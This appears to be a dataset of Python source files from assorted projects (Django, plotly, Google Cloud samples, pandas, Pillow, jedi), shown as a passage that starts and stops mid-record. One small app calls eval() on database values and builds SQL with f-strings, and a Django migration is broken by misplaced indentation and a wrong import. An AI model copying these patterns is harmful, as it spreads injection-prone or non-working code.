	end_date = forms.DateField(widget=forms.SelectDateWidget())"
JD279	JD279-0001_initial.py	"# Generated by Django 3.2.16 on 2023-02-10 16:24

from django.db import migrations, models
from django.template.backends import django


class Migration(migrations.Migration):

    initial = True

    dependencies = [
    ]


operations = [
        migrations.CreateModel(
            name='Category',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('name', models.CharField(db_index=True, max_length=100, verbose_name='Категория')),
                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),
            ],
            options={
                'verbose_name': 'Категория',
                'verbose_name_plural': 'Категории',
                'ordering': ['id'],
            },
        ),
        migrations.CreateModel(
            name='Food',
            fields=[
                ('id', models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID')),
                ('title', models.CharField(max_length=255, verbose_name='Заголовок')),
                ('slug', models.SlugField(max_length=255, unique=True, verbose_name='URL')),
                ('content', models.TextField(blank=True, verbose_name='Текст статьи')),
                ('photo', models.ImageField(upload_to='photos/%Y/%m/%d/', verbose_name='Фото')),
                ('time_create', models.DateTimeField(auto_now_add=True, verbose_name='Время создания')),
                ('time_update', models.DateTimeField(auto_now=True, verbose_name='Время изменения')),
                ('is_published', models.BooleanField(default=True, verbose_name='Публикация')),
                ('cat', models.ForeignKey(on_delete=django.db.models.deletion.PROTECT, to='food.category', verbose_name='Категории')),
            ],
            options={
                'verbose_name': 'Известные ,блюда',
                'verbose_name_plural': 'Известные блюда',
                'ordering': ['-time_create', 'title'],
            },
        ),
    ]"
JY436	JY436-action.py	"import gws
import gws.base.action
import gws.base.layer
import gws.base.legend
import gws.gis.cache
import gws.gis.crs
import gws.base.feature
import gws.lib.image
import gws.lib.jsonx
import gws.lib.mime
import gws.gis.render
import gws.lib.uom as units
import gws.types as t

gws.ext.new.action('edit')


class Config(gws.base.action.Config):
    pass


class Props(gws.base.action.Props):
    pass


class GetBoxRequest(gws.Request):
    bbox: gws.Extent
    width: int
    height: int
    layerUid: str
    crs: t.Optional[gws.CrsName]
    dpi: t.Optional[int]
    layers: t.Optional[t.List[str]]


class GetXyzRequest(gws.Request):
    layerUid: str
    x: int
    y: int
    z: int


class GetLegendRequest(gws.Request):
    layerUid: str


class ImageResponse(gws.Response):
    content: bytes
    mime: str


class DescribeLayerRequest(gws.Request):
    layerUid: str


class DescribeLayerResponse(gws.Request):
    description: str


class GetFeaturesRequest(gws.Request):
    bbox: t.Optional[gws.Extent]
    layerUid: str
    crs: t.Optional[gws.CrsName]
    resolution: t.Optional[float]
    limit: int = 0


class GetFeaturesResponse(gws.Response):
    features: t.List[gws.FeatureProps]


class Object(gws.base.action.Object):
    @gws.ext.command.api('editGetLayers')
    def api_get_layers(self, req: gws.IWebRequester, p: GetXyzRequest) -> ImageResponse:
        """"""Get an XYZ tile""""""

        ls = []

        la: gws.ILayer
        for la in self.root.find_all(gws.ext.object.layer):
            if not la.layers and req.user.can_use(la):
                model = la.modelMgr.model_for(req.user, allow=gws.WRITE)
                if model:
                    ls.append(dict(
                        layerUid=la.uid,
                        modelUid=model.uid
                    ))"
JD227	JD227-cp949prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .chardistribution import EUCKRDistributionAnalysis
from .codingstatemachine import CodingStateMachine
from .mbcharsetprober import MultiByteCharSetProber
from .mbcssm import CP949_SM_MODEL


class CP949Prober(MultiByteCharSetProber):
    def __init__(self):
        super().__init__()
        self.coding_sm = CodingStateMachine(CP949_SM_MODEL)
        # NOTE: CP949 is a superset of EUC-KR, so the distribution should be
        #       not different.
        self.distribution_analyzer = EUCKRDistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""CP949""

    @property
    def language(self):
        return ""Korean"""
JY206	JY206-test_deepreload.py	"# -*- coding: utf-8 -*-
""""""Test suite for the deepreload module.""""""

# Copyright (c) IPython Development Team.
# Distributed under the terms of the Modified BSD License.

import types
from pathlib import Path

import pytest
from tempfile import TemporaryDirectory

from IPython.lib.deepreload import modules_reloading
from IPython.lib.deepreload import reload as dreload
from IPython.utils.syspathcontext import prepended_to_syspath


def test_deepreload():
    ""Test that dreload does deep reloads and skips excluded modules.""
    with TemporaryDirectory() as tmpdir:
        with prepended_to_syspath(tmpdir):
            tmpdirpath = Path(tmpdir)
            with open(tmpdirpath / ""A.py"", ""w"", encoding=""utf-8"") as f:
                f.write(""class Object:\n    pass\nok = True\n"")
            with open(tmpdirpath / ""B.py"", ""w"", encoding=""utf-8"") as f:
                f.write(""import A\nassert A.ok, 'we are fine'\n"")
            import A
            import B

            # Test that A is not reloaded.
            obj = A.Object()
            dreload(B, exclude=[""A""])
            assert isinstance(obj, A.Object) is True

            # Test that an import failure will not blow-up us.
            A.ok = False
            with pytest.raises(AssertionError, match=""we are fine""):
                dreload(B, exclude=[""A""])
            assert len(modules_reloading) == 0
            assert not A.ok

            # Test that A is reloaded.
            obj = A.Object()
            A.ok = False
            dreload(B)
            assert A.ok
            assert isinstance(obj, A.Object) is False


def test_not_module():
    pytest.raises(TypeError, dreload, ""modulename"")


def test_not_in_sys_modules():
    fake_module = types.ModuleType(""fake_module"")
    with pytest.raises(ImportError, match=""not in sys.modules""):
        dreload(fake_module)"
JY403	JY403-_outsidetextfont.py	"import _plotly_utils.basevalidators


class OutsidetextfontValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""outsidetextfont"", parent_name=""funnel"", **kwargs):
        super(OutsidetextfontValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Outsidetextfont""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            color

            colorsrc
                Sets the source reference on Chart Studio Cloud
                for `color`.
            family
                HTML font family - the typeface that will be
                applied by the web browser. The web browser
                will only be able to apply a font if it is
                available on the system which it operates.
                Provide multiple font families, separated by
                commas, to indicate the preference in which to
                apply fonts if they aren't available on the
                system. The Chart Studio Cloud (at
                https://chart-studio.plotly.com or on-premise)
                generates images on a server, where only a
                select number of fonts are installed and
                supported. These include ""Arial"", ""Balto"",
                ""Courier New"", ""Droid Sans"",, ""Droid Serif"",
                ""Droid Sans Mono"", ""Gravitas One"", ""Old
                Standard TT"", ""Open Sans"", ""Overpass"", ""PT Sans
                Narrow"", ""Raleway"", ""Times New Roman"".
            familysrc
                Sets the source reference on Chart Studio Cloud
                for `family`.
            size

            sizesrc
                Sets the source reference on Chart Studio Cloud
                for `size`.
"""""",
            ),
            **kwargs,
        )"
JY378	JY378-attachments.py	"""""""Basic implementation to support SOAP-Attachments

See https://www.w3.org/TR/SOAP-attachments

""""""

import base64

from cached_property import cached_property
from requests.structures import CaseInsensitiveDict


class MessagePack:
    def __init__(self, parts):
        self._parts = parts

    def __repr__(self):
        return ""<MessagePack(attachments=[%s])>"" % (
            "", "".join(repr(a) for a in self.attachments)
        )

    @property
    def root(self):
        return self._root

    def _set_root(self, root):
        self._root = root

    @cached_property
    def attachments(self):
        """"""Return a list of attachments.

        :rtype: list of Attachment

        """"""
        return [Attachment(part) for part in self._parts]

    def get_by_content_id(self, content_id):
        """"""get_by_content_id

        :param content_id: The content-id to return
        :type content_id: str
        :rtype: Attachment

        """"""
        for attachment in self.attachments:
            if attachment.content_id == content_id:
                return attachment


class Attachment:
    def __init__(self, part):
        encoding = part.encoding or ""utf-8""
        self.headers = CaseInsensitiveDict(
            {k.decode(encoding): v.decode(encoding) for k, v in part.headers.items()}
        )
        self.content_type = self.headers.get(""Content-Type"", None)
        self.content_id = self.headers.get(""Content-ID"", None)
        self.content_location = self.headers.get(""Content-Location"", None)
        self._part = part

    def __repr__(self):
        return ""<Attachment(%r, %r)>"" % (self.content_id, self.content_type)

    @cached_property
    def content(self):
        """"""Return the content of the attachment

        :rtype: bytes or str

        """"""
        encoding = self.headers.get(""Content-Transfer-Encoding"", None)
        content = self._part.content

        if encoding == ""base64"":
            return base64.b64decode(content)
        elif encoding == ""binary"":
            return content.strip(b""\r\n"")
        else:
            return content"
JD398	JD398-delete_site_key.py	"#!/usr/bin/env python
# Copyright 2021 Google, Inc
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# All Rights Reserved.

# [START recaptcha_enterprise_delete_site_key]
from google.cloud import recaptchaenterprise_v1


def delete_site_key(project_id: str, recaptcha_site_key: str) -> None:
    """"""Delete the given reCAPTCHA site key present under the project ID.

    Args:
    project_id : GCloud Project ID.
    recaptcha_site_key: Specify the key ID to be deleted.
    """"""

    client = recaptchaenterprise_v1.RecaptchaEnterpriseServiceClient()

    # Construct the key details.
    key_name = f""projects/{project_id}/keys/{recaptcha_site_key}""

    # Set the project ID and reCAPTCHA site key.
    request = recaptchaenterprise_v1.DeleteKeyRequest()
    request.name = key_name

    client.delete_key(request)
    print(""reCAPTCHA Site key deleted successfully ! "")


# [END recaptcha_enterprise_delete_site_key]


if __name__ == ""__main__"":
    import google.auth
    import google.auth.exceptions

    # TODO(developer): Replace the below variables before running
    try:
        default_project_id = google.auth.default()[1]
        recaptcha_site_key = ""recaptcha_site_key""
    except google.auth.exceptions.DefaultCredentialsError:
        print(
            ""Please use `gcloud auth application-default login` ""
            ""or set GOOGLE_APPLICATION_CREDENTIALS to use this script.""
        )
    else:
        delete_site_key(default_project_id, recaptcha_site_key)"
JD277	JD277-FitsImagePlugin.py	"#
# The Python Imaging Library
# $Id$
#
# FITS file handling
#
# Copyright (c) 1998-2003 by Fredrik Lundh
#
# See the README file for information on usage and redistribution.
#

import math

from . import Image, ImageFile


def _accept(prefix):
    return prefix[:6] == b""SIMPLE""


class FitsImageFile(ImageFile.ImageFile):

    format = ""FITS""
    format_description = ""FITS""

    def _open(self):
        headers = {}
        while True:
            header = self.fp.read(80)
            if not header:
                msg = ""Truncated FITS file""
                raise OSError(msg)
            keyword = header[:8].strip()
            if keyword == b""END"":
                break
            value = header[8:].strip()
            if value.startswith(b""=""):
                value = value[1:].strip()
            if not headers and (not _accept(keyword) or value != b""T""):
                msg = ""Not a FITS file""
                raise SyntaxError(msg)
            headers[keyword] = value

        naxis = int(headers[b""NAXIS""])
        if naxis == 0:
            msg = ""No image data""
            raise ValueError(msg)
        elif naxis == 1:
            self._size = 1, int(headers[b""NAXIS1""])
        else:
            self._size = int(headers[b""NAXIS1""]), int(headers[b""NAXIS2""])

        number_of_bits = int(headers[b""BITPIX""])
        if number_of_bits == 8:
            self.mode = ""L""
        elif number_of_bits == 16:
            self.mode = ""I""
            # rawmode = ""I;16S""
        elif number_of_bits == 32:
            self.mode = ""I""
        elif number_of_bits in (-32, -64):
            self.mode = ""F""
            # rawmode = ""F"" if number_of_bits == -32 else ""F;64F""

        offset = math.ceil(self.fp.tell() / 2880) * 2880
        self.tile = [(""raw"", (0, 0) + self.size, offset, (self.mode, 0, -1))]


# --------------------------------------------------------------------
# Registry

Image.register_open(FitsImageFile.format, FitsImageFile, _accept)

Image.register_extensions(FitsImageFile.format, ["".fit"", "".fits""])"
JY414	JY414-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""contour"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY401	JY401-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""funnel"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY467	JY467-parse.py	"import os


def parse_distributions_h(ffi, inc_dir):
    """"""
    Parse distributions.h located in inc_dir for CFFI, filling in the ffi.cdef

    Read the function declarations without the ""#define ..."" macros that will
    be filled in when loading the library.
    """"""

    with open(os.path.join(inc_dir, 'random', 'bitgen.h')) as fid:
        s = []
        for line in fid:
            # massage the include file
            if line.strip().startswith('#'):
                continue
            s.append(line)
        ffi.cdef('\n'.join(s))

    with open(os.path.join(inc_dir, 'random', 'distributions.h')) as fid:
        s = []
        in_skip = 0
        ignoring = False
        for line in fid:
            # check for and remove extern ""C"" guards
            if ignoring:
                if line.strip().startswith('#endif'):
                    ignoring = False
                continue
            if line.strip().startswith('#ifdef __cplusplus'):
                ignoring = True
            
            # massage the include file
            if line.strip().startswith('#'):
                continue
    
            # skip any inlined function definition
            # which starts with 'static NPY_INLINE xxx(...) {'
            # and ends with a closing '}'
            if line.strip().startswith('static NPY_INLINE'):
                in_skip += line.count('{')
                continue
            elif in_skip > 0:
                in_skip += line.count('{')
                in_skip -= line.count('}')
                continue
    
            # replace defines with their value or remove them
            line = line.replace('DECLDIR', '')
            line = line.replace('NPY_INLINE', '')
            line = line.replace('RAND_INT_TYPE', 'int64_t')
            s.append(line)
        ffi.cdef('\n'.join(s))
"
JD312	JD312-adaptation_v2_phrase_set_reference_test.py	"# Copyright 2022 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import re
from uuid import uuid4

from google.cloud.speech_v2 import SpeechClient
from google.cloud.speech_v2.types import cloud_speech

import adaptation_v2_phrase_set_reference

RESOURCES = os.path.join(os.path.dirname(__file__), ""resources"")


def delete_recognizer(name):
    client = SpeechClient()
    request = cloud_speech.DeleteRecognizerRequest(name=name)
    client.delete_recognizer(request=request)


def delete_phrase_set(name):
    client = SpeechClient()
    request = cloud_speech.DeletePhraseSetRequest(name=name)
    client.delete_phrase_set(request=request)


def test_adaptation_v2_phrase_set_reference(capsys):
    project_id = os.getenv(""GOOGLE_CLOUD_PROJECT"")

    recognizer_id = ""recognizer-"" + str(uuid4())
    phrase_set_id = ""phrase-set-"" + str(uuid4())
    response = adaptation_v2_phrase_set_reference.adaptation_v2_phrase_set_reference(
        project_id, recognizer_id, phrase_set_id, os.path.join(RESOURCES, ""fair.wav"")
    )

    assert re.search(
        r""the word is fare"",
        response.results[0].alternatives[0].transcript,
        re.DOTALL | re.I,
    )

    delete_recognizer(
        f""projects/{project_id}/locations/global/recognizers/{recognizer_id}""
    )

    delete_phrase_set(
        f""projects/{project_id}/locations/global/phraseSets/{phrase_set_id}""
    )"
JD515	JD515-conftest.py	"import numpy as np
import pytest

import pandas as pd
from pandas import (
    Index,
    MultiIndex,
)


# Note: identical the ""multi"" entry in the top-level ""index"" fixture
@pytest.fixture
def idx():
    # a MultiIndex used to test the general functionality of the
    # general functionality of this object
    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])
    minor_axis = Index([""one"", ""two""])

    major_codes = np.array([0, 0, 1, 2, 3, 3])
    minor_codes = np.array([0, 1, 0, 1, 0, 1])
    index_names = [""first"", ""second""]
    mi = MultiIndex(
        levels=[major_axis, minor_axis],
        codes=[major_codes, minor_codes],
        names=index_names,
        verify_integrity=False,
    )
    return mi


@pytest.fixture
def idx_dup():
    # compare tests/indexes/multi/conftest.py
    major_axis = Index([""foo"", ""bar"", ""baz"", ""qux""])
    minor_axis = Index([""one"", ""two""])

    major_codes = np.array([0, 0, 1, 0, 1, 1])
    minor_codes = np.array([0, 1, 0, 1, 0, 1])
    index_names = [""first"", ""second""]
    mi = MultiIndex(
        levels=[major_axis, minor_axis],
        codes=[major_codes, minor_codes],
        names=index_names,
        verify_integrity=False,
    )
    return mi


@pytest.fixture
def index_names():
    # names that match those in the idx fixture for testing equality of
    # names assigned to the idx
    return [""first"", ""second""]


@pytest.fixture
def narrow_multi_index():
    """"""
    Return a MultiIndex that is narrower than the display (<80 characters).
    """"""
    n = 1000
    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))
    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)
    return MultiIndex.from_arrays([ci, ci.codes + 9, dti], names=[""a"", ""b"", ""dti""])


@pytest.fixture
def wide_multi_index():
    """"""
    Return a MultiIndex that is wider than the display (>80 characters).
    """"""
    n = 1000
    ci = pd.CategoricalIndex(list(""a"" * n) + ([""abc""] * n))
    dti = pd.date_range(""2000-01-01"", freq=""s"", periods=n * 2)
    levels = [ci, ci.codes + 9, dti, dti, dti]
    names = [""a"", ""b"", ""dti_1"", ""dti_2"", ""dti_3""]
    return MultiIndex.from_arrays(levels, names=names)"
JD288	JD288-app.py	"import essential as x
import sqlite3
import rituais

def app():
    isRunning = True
    command = """"
    
    while isRunning:
        
        x.clear()
        
        if command == """": 
            ficha()
        
        if command == ""rituais"": 
            rituais.menu_rituais()
            command = """"
            continue
        
        
        command = input(""""""
comandos:
[rituais] - menu de rituais
[habilidades] - menu de habilidades
[poderes] - menu de poderes
[editar] - editar informações da ficha
[exit] - fechar aplicação

insira um comando: """""")
        
        if command.lower() == ""exit"":
            isRunning = False

def ficha():
    conn = sqlite3.connect(x.DBPATH)
    cur = conn.cursor()

    query = f""SELECT * FROM usuario WHERE id = 1""
    cur.execute(query)
    
    user = cur.fetchone()
    
    rituais = eval(user[3])
    # TODO: Habilidades e poderes
    habilidades = eval(user[4])
    poderes = eval(user[5])
    status = eval(user[6])
    ritual_text = """"
    
    ritual_ids = []
    
    if len(rituais) > 0:
        for ritual in rituais:
            ritual_ids.append(ritual['id'])
        
        ids_tuple = tuple(ritual_ids)
        query = f""SELECT * FROM rituais WHERE id IN {ids_tuple}""
        
        cur.execute(query)
        rituais_list = cur.fetchall()
        
        index = 0
        # TODO: aguardar complemento dos rituais
        for ritual in rituais_list:
            ritual_text += f""\n[{index + 1}] - [{ritual[1]}] ""
            index += 1
        
    else: ritual_text += ""\nNão tem rituais""
    
    print(f""""""
             vida: {status['hp']}/{status['hp_atual']}
         sanidade: {status['sn']}/{status['sn_atual']}
pontos de esforço: {status['pe']}/{status['pe_atual']}
=========================================================
rituais: {ritual_text}
    """""")"
JY36	JY36-rpn_r50_caffe_c4.py	"# model settings
model = dict(
    type='RPN',
    backbone=dict(
        type='ResNet',
        depth=50,
        num_stages=3,
        strides=(1, 2, 2),
        dilations=(1, 1, 1),
        out_indices=(2, ),
        frozen_stages=1,
        norm_cfg=dict(type='BN', requires_grad=False),
        norm_eval=True,
        style='caffe',
        init_cfg=dict(
            type='Pretrained',
            checkpoint='open-mmlab://detectron2/resnet50_caffe')),
    neck=None,
    rpn_head=dict(
        type='RPNHead',
        in_channels=1024,
        feat_channels=1024,
        anchor_generator=dict(
            type='AnchorGenerator',
            scales=[2, 4, 8, 16, 32],
            ratios=[0.5, 1.0, 2.0],
            strides=[16]),
        bbox_coder=dict(
            type='DeltaXYWHBBoxCoder',
            target_means=[.0, .0, .0, .0],
            target_stds=[1.0, 1.0, 1.0, 1.0]),
        loss_cls=dict(
            type='CrossEntropyLoss', use_sigmoid=True, loss_weight=1.0),
        loss_bbox=dict(type='L1Loss', loss_weight=1.0)),
    # model training and testing settings
    train_cfg=dict(
        rpn=dict(
            assigner=dict(
                type='MaxIoUAssigner',
                pos_iou_thr=0.7,
                neg_iou_thr=0.3,
                min_pos_iou=0.3,
                ignore_iof_thr=-1),
            sampler=dict(
                type='RandomSampler',
                num=256,
                pos_fraction=0.5,
                neg_pos_ub=-1,
                add_gt_as_proposals=False),
            allowed_border=0,
            pos_weight=-1,
            debug=False)),
    test_cfg=dict(
        rpn=dict(
            nms_pre=12000,
            max_per_img=2000,
            nms=dict(type='nms', iou_threshold=0.7),
            min_bbox_size=0)))"
JD334	JD334-reference_image_management_test.py	"# Copyright 2016 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import os
import uuid

import pytest

from product_management import create_product, delete_product
from reference_image_management import (
    create_reference_image, delete_reference_image, list_reference_images)


PROJECT_ID = os.getenv('GOOGLE_CLOUD_PROJECT')
LOCATION = 'us-west1'

PRODUCT_DISPLAY_NAME = 'fake_product_display_name_for_testing'
PRODUCT_CATEGORY = 'homegoods'
PRODUCT_ID = 'test_{}'.format(uuid.uuid4())

REFERENCE_IMAGE_ID = 'fake_reference_image_id_for_testing'
GCS_URI = 'gs://cloud-samples-data/vision/product_search/shoes_1.jpg'


@pytest.fixture(scope=""function"", autouse=True)
def setup_teardown():
    # set up
    create_product(
        PROJECT_ID, LOCATION, PRODUCT_ID,
        PRODUCT_DISPLAY_NAME, PRODUCT_CATEGORY)

    yield None

    # tear down
    delete_product(PROJECT_ID, LOCATION, PRODUCT_ID)


def test_create_reference_image(capsys):
    create_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,
        GCS_URI)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID in out


def test_delete_reference_image(capsys):
    create_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID,
        GCS_URI)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID in out

    delete_reference_image(
        PROJECT_ID, LOCATION, PRODUCT_ID, REFERENCE_IMAGE_ID)
    list_reference_images(PROJECT_ID, LOCATION, PRODUCT_ID)
    out, _ = capsys.readouterr()
    assert REFERENCE_IMAGE_ID not in out"
JY258	JY258-models.py	"from django.db import models
from django.contrib.auth import get_user_model
from django.core.exceptions import ValidationError
from drugs_app.models import Drug, TimeStampedModel
from django.conf import settings


User = get_user_model()


class Order(TimeStampedModel):
    STATUS = (
        (""Pending"", ""Pending""),
        (""Completed"", ""Completed""),
    )
    user = models.ForeignKey(
        settings.AUTH_USER_MODEL, on_delete=models.CASCADE, related_name=""orders""
    )
    status = models.CharField(default=""Pending"", choices=STATUS, max_length=10)
    description = models.TextField()

    class Meta:
        db_table = ""orders_db""

    @property
    def total_price(self) -> int:
        total_price = 0
        for drug in self.ordered_drugs.all():
            total_price += float(drug.total_drug_price)
        return total_price

    def set_status(self, status):
        self.status = status
        self.save()


class OrderedDrug(models.Model):

    drug = models.ForeignKey(
        Drug, on_delete=models.CASCADE, related_name=""related_orders""
    )
    order = models.ForeignKey(
        Order, on_delete=models.CASCADE, related_name=""ordered_drugs""
    )
    quantity = models.PositiveIntegerField()

    class Meta:
        unique_together = [""order"", ""drug""]
        db_table = ""ordered_drugs_db""

    def validate_unique(self, **kwargs) -> None:
        try:
            return super().validate_unique(**kwargs)
        except:
            raise ValidationError(""cannot add the drug in the same order more than one"")

    @property
    def total_drug_price(self):
        return ""%.2f"" % (float(self.drug.drug_price) * int(self.quantity))

    def clean(self):
        if self.quantity < 1:
            raise ValidationError(""The quantity must be above or equal 1"")

        if self.quantity > self.drug.quantity:
            raise ValidationError(
                f""Please add quantity value lower than {self.drug.quantity}""
            )

    def save(self, *args, **kwargs) -> None:
        self.full_clean()
        return super().save(*args, **kwargs)"
JY331	JY331-__init__.py	"# mssql/__init__.py
# Copyright (C) 2005-2023 the SQLAlchemy authors and contributors
# <see AUTHORS file>
#
# This module is part of SQLAlchemy and is released under
# the MIT License: https://www.opensource.org/licenses/mit-license.php
# mypy: ignore-errors


from . import base  # noqa
from . import pymssql  # noqa
from . import pyodbc  # noqa
from .base import BIGINT
from .base import BINARY
from .base import BIT
from .base import CHAR
from .base import DATE
from .base import DATETIME
from .base import DATETIME2
from .base import DATETIMEOFFSET
from .base import DECIMAL
from .base import FLOAT
from .base import IMAGE
from .base import INTEGER
from .base import JSON
from .base import MONEY
from .base import NCHAR
from .base import NTEXT
from .base import NUMERIC
from .base import NVARCHAR
from .base import REAL
from .base import ROWVERSION
from .base import SMALLDATETIME
from .base import SMALLINT
from .base import SMALLMONEY
from .base import SQL_VARIANT
from .base import TEXT
from .base import TIME
from .base import TIMESTAMP
from .base import TINYINT
from .base import try_cast
from .base import UNIQUEIDENTIFIER
from .base import VARBINARY
from .base import VARCHAR
from .base import XML


base.dialect = dialect = pyodbc.dialect


__all__ = (
    ""JSON"",
    ""INTEGER"",
    ""BIGINT"",
    ""SMALLINT"",
    ""TINYINT"",
    ""VARCHAR"",
    ""NVARCHAR"",
    ""CHAR"",
    ""NCHAR"",
    ""TEXT"",
    ""NTEXT"",
    ""DECIMAL"",
    ""NUMERIC"",
    ""FLOAT"",
    ""DATETIME"",
    ""DATETIME2"",
    ""DATETIMEOFFSET"",
    ""DATE"",
    ""TIME"",
    ""SMALLDATETIME"",
    ""BINARY"",
    ""VARBINARY"",
    ""BIT"",
    ""REAL"",
    ""IMAGE"",
    ""TIMESTAMP"",
    ""ROWVERSION"",
    ""MONEY"",
    ""SMALLMONEY"",
    ""UNIQUEIDENTIFIER"",
    ""SQL_VARIANT"",
    ""XML"",
    ""dialect"",
    ""try_cast"",
)"
JY181	JY181-__main__.py	"import sys
from os.path import join, dirname, abspath, isdir


def _start_linter():
    """"""
    This is a pre-alpha API. You're not supposed to use it at all, except for
    testing. It will very likely change.
    """"""
    import jedi

    if '--debug' in sys.argv:
        jedi.set_debug_function()

    for path in sys.argv[2:]:
        if path.startswith('--'):
            continue
        if isdir(path):
            import fnmatch
            import os

            paths = []
            for root, dirnames, filenames in os.walk(path):
                for filename in fnmatch.filter(filenames, '*.py'):
                    paths.append(os.path.join(root, filename))
        else:
            paths = [path]

        try:
            for p in paths:
                for error in jedi.Script(path=p)._analysis():
                    print(error)
        except Exception:
            if '--pdb' in sys.argv:
                import traceback
                traceback.print_exc()
                import pdb
                pdb.post_mortem()
            else:
                raise


def _complete():
    import jedi
    import pdb

    if '-d' in sys.argv:
        sys.argv.remove('-d')
        jedi.set_debug_function()

    try:
        completions = jedi.Script(sys.argv[2]).complete()
        for c in completions:
            c.docstring()
            c.type
    except Exception as e:
        print(repr(e))
        pdb.post_mortem()
    else:
        print(completions)


if len(sys.argv) == 2 and sys.argv[1] == 'repl':
    # don't want to use __main__ only for repl yet, maybe we want to use it for
    # something else. So just use the keyword ``repl`` for now.
    print(join(dirname(abspath(__file__)), 'api', 'replstartup.py'))
elif len(sys.argv) > 1 and sys.argv[1] == '_linter':
    _start_linter()
elif len(sys.argv) > 1 and sys.argv[1] == '_complete':
